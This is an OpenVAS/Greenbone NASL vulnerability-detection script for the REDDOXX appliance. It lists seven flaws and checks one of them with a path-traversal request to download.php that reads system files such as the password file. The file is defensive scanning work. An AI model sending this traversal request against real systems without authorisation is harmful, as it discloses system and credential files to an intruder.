# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:reddoxx:reddox_appliance";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106983");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2017-07-25 10:58:24 +0700 (Tue, 25 Jul 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("REDDOX Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_reddoxx_web_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("reddoxx/detected");

  script_tag(name:"summary", value:"REDDOXX Appliance is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"REDDOXX Appliance is prone to multiple vulnerabilities:

  - Cross-Site Scripting vulnerability, which allows attackers to inject arbitrary JavaScript code via a crafted
  URL.

  - Unauthenticated Arbitrary File Disclosure, which allows unauthenticated attackers to download arbitrary files
  from the affected system.

  - Unauthenticated Extraction of Session-IDs, which allows unauthenticated attackers to extract valid session IDs.

  - Arbitrary File Disclosure with root Privileges via RdxEngine-API, which allows unauthenticated attackers to list
  directory contents and download arbitrary files from the affected system with root permissions.

  - Undocumented Administrative Service Account, which allows attackers to access the administrative interface of the
  appliance and change its configuration.

  - Unauthenticated Access to Diagnostic Functions, which allows attackers unauthenticated access to the diagnostic
  functions of the administrative interface of the REDDOXX appliance. The functions allow, for example, to capture
  network traffic on the appliance's interfaces.

  - Remote Command Execution as root, which allows attackers to execute arbitrary command with root privileges while
  unauthenticated.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"REDDOXX Appliance 2032 SP1 and prior.");

  script_tag(name:"solution", value:"Update to version 2032 SP2 or later.");

  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-003/-cross-site-scripting-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-004/-unauthenticated-arbitrary-file-disclosure-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-005/-unauthenticated-extraction-of-session-ids-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-006/-arbitrary-file-disclosure-with-root-privileges-via-rdxengine-api-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-007/-undocumented-administrative-service-account-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-008/-unauthenticated-access-to-diagnostic-functions-in-reddoxx-appliance");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2017-009/-remote-command-execution-as-root-in-reddoxx-appliance");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/download.php?file=/opt/reddoxx/data/temp/Sessions/../../../../../" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
